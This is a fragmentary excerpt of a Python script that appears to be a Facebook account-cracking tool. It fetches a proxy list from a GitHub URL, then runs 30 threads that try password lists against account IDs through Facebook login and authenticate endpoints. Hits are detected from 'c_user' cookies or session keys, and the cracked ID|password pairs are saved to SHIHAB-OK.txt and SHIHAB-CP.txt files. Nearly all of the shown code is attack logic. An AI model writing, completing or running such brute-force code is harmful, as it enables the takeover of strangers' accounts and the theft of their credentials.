...
try:
    prox= requests.get('https://raw.githubusercontent.com/SHIHAB/Proxy/main/prox.txt').text
...
def file_cloning():
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' [+]-------------------------------------------------------')
                                        print(" [+] OK IDZ SAVE ✓ SHIHAB-OK.txt")
                                        print(" [+] CP IDZ SAVE × SHIHAB-CP.txt")
                                        print(' [+]-------------------------------------------------------')
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r [SHIHAB-F1] %s|OK:-%s '%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in AWM:
                                ...
                                print('\r\r [SHIHAB-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SHIHAB-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AWM:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SHIHAB-CP] '+ids+' | '+pas+'')
...
def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r [SHIHAB-F2] %s|OK:-%s '%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r [SHIHAB-R] %s|OK:-%s '%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                    ...
                    'x-fb-friendly-name':'authenticate'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/SHIHAB-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r [SHIHAB-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/SHIHAB-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r [SHIHAB-OK] '+uid+' | '+pas+'')
                                                open('/sdcard/SHIHAB-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
